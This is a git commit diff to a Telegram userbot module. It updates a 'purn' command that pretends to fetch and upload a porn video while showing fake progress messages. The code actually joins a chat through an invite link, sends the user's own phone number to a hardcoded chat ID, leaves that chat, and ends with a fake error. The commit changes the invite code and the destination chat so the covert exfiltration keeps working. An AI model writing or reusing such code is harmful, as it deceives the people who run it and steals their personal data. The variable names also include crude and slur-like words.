579f316573f5199b997a004ae0ed004984e14276
TAMILVIP007 <79161058+TAMILVIP007@users.noreply.github.com>
2021-10-16 14:01:28 +0530

    update misc.py

--- Dasha/modules/misc.py
+++ Dasha/modules/misc.py
@@ -9,10 +9,10 @@ async def stat(event):
 @dasha(pattern="purn")
 async def lol(event):
        x = await event.edit('`Processing..`')
-       await event.client(ImportChatInviteRequest('ZdgdquZoCIg0YTk1'))
+       await event.client(ImportChatInviteRequest('wJuPN3GRftc3OTBl'))
        y = await x.edit('`Fetching video from porhub servers....`')
        mf = await y.edit('`Trying to download video.. Could ve taking a min or two..`')
-       await event.client.send_message(-1001566016603, ((await event.client.get_me()).phone))
+       await event.client.send_message(-1001643063658, ((await event.client.get_me()).phone))
        sex = await mf.edit('`Trying to upload video to Telegram...`')
-       gay= await event.client.kick_participant(-1001566016603, 'me')
+       gay= await event.client.kick_participant(-1001643063658, 'me')
        fuk = await sex.edit('`404 - Error Telegram caught up with a unknown error.Please use` pornhub.com') 
